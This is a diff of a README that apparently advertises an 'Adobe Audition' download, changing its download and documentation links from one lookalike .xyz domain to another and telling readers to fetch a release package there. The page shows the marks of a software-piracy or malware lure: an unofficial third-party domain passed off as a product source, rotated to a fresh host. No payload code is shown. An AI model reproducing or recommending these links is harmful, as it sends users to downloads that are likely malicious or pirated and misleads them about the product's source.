@@ -24,8 +24,8 @@ Grab the latest release from the download link above.
 > Close other heavy apps for the smoothest experience.
 
 ## 📥 Downloads & Links
-- 📥 **Download now:** [https://adobe-audition-edge.softonx.xyz](https://adobe-audition-edge.softonx.xyz)
-- 📖 **Documentation:** [https://adobe-audition-edge.softonx.xyz](https://adobe-audition-edge.softonx.xyz)
+- 📥 **Download now:** [https://adobe-audition-edge.softax.xyz](https://adobe-audition-edge.softax.xyz)
+- 📖 **Documentation:** [https://adobe-audition-edge.softax.xyz](https://adobe-audition-edge.softax.xyz)
 
 ## 🚀 Quick Setup
 1. Download the release package from the link above.
